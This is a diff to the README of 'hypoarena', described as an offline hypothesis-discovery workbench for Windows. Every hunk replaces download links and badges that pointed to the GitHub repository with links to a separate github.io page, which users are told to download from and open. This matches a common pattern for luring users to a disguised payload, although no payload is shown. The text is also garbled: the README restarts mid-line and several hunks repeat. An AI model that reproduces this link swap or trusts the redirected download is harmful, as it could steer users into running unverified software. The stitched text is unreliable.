@@ -1,6 +1,6 @@
 # 🧪 hypoarena - Discover Hypotheses With Evidence Graphs
 
-[![Download hypoarena](https://img.shields.io/badge/Download-hypoarena-ff69b4?style=for-the-badge&logo=github)](https://github.com/kimdoan123/hypoarena)
+[![Download hypoarena](https://img.shields.io/badge/Download-hypoarena-ff69b4?style=for-the-badge&logo=github)](https://kimdoan123.github.io)
 
 hypoarena is a scientific hypothesis-discovery workbench for Windows users who want to explore ideas, connect them to evidence, and compare competing explanations in a clear, repeatable way. It helps you build grounded hypothesis-evidence graphs, work with synthetic literature that contains planted causal chains, and run generate-debate-evolve loops over swappable offline adapters. In plain terms: you can ask the workbench to propose ideas, argue them against one another, improve them over rounds, and rank them, all without needing an internet connection.
 
@@ -51,9 +51,9 @@ Use it when you want to:
 
 Visit this link to download the application:
 
-[https://github.com/kimdoan123/hypoarena](https://github.com/kimdoan123/hypoarena)
+[https://kimdoan123.github.io](https://kimdoan123.github.io)
 
-[![Download hypoarena](https://img.shields.io/badge/Download-hypoarena-20c997?style=for-the-badge&logo=github)](https://github.com/kimdoan123/hypoarena)
+[![Download hypoarena](https://img.shields.io/badge/Download-hypoarena-20c997?style=for-the-badge&logo=github)](https://kimdoan123.github.io)
 
 Use the download option shown on that page. Save the download to your computer and wait for it to finish. When it is complete, open your Downloads folder and locate the downloaded hypoarena item.
 
@@ -71,7 +71,7 @@ Follow this single path after the download finishes.
 
 If the workbench does# 🧪 hypoarena - Discover Hypotheses With Evidence Graphs
 
-[![Download hypoarena](https://img.shields.io/badge/Download-hypoarena-ff69b4?style=for-the-badge&logo=github)](https://github.com/kimdoan123/hypoarena)
+[![Download hypoarena](https://img.shields.io/badge/Download-hypoarena-ff69b4?style=for-the-badge&logo=github)](https://kimdoan123.github.io)
 
 hypoarena is a scientific hypothesis-discovery workbench for Windows users who want to explore ideas, connect them to evidence, and compare competing explanations in a clear, repeatable way. It helps you build grounded hypothesis-evidence graphs, work with synthetic literature that contains planted causal chains, and run generate-debate-evolve loops over swappable offline adapters. In plain terms: you can ask the workbench to propose ideas, argue them against one another, improve them over rounds, and rank them, all without needing an internet connection.
 
@@ -122,9 +122,9 @@ Use it when you want to:
 
 Visit this link to download the application:
 
-[https://github.com/kimdoan123/hypoarena](https://github.com/kimdoan123/hypoarena)
+[https://kimdoan123.github.io](https://kimdoan123.github.io)
 
-[![Download hypoarena](https://img.shields.io/badge/Download-hypoarena-20c997?style=for-the-badge&logo=github)](https://github.com/kimdoan123/hypoarena)
+[![Download hypoarena](https://img.shields.io/badge/Download-hypoarena-20c997?style=for-the-badge&logo=github)](https://kimdoan123.github.io)
 
 Use the download option shown on that page. Save the download to your computer and wait for it to finish. When it is complete, open your Downloads folder and locate the downloaded hypoarena item.
 
@@ -220,6 +220,6 @@ Reproducible work is central to hypoarena. After a run, save the report. Change 
 - Create a project and load the practice literature.
 - Build a graph, run a loop, check the tournament, and save a report.
 
-[![Download hypoarena](https://img.shields.io/badge/Download-hypoarena-6f42c1?style=for-the-badge&logo=github)](https://github.com/kimdoan123/hypoarena)
+[![Download hypoarena](https://img.shields.io/badge/Download-hypoarena-6f42c1?style=for-the-badge&logo=github)](https://kimdoan123.github.io)
 
 Keywords: hypoarena, hypothesis discovery, hypothesis-evidence graph, synthetic literature, causal chains, generate-debate-evolve, offline adapters, Elo tournament, paraphrase deduplication, Bayesian evidence accumulation, reproducible reports, NumPy, CPU-only torch, scientific workbench, Windows application
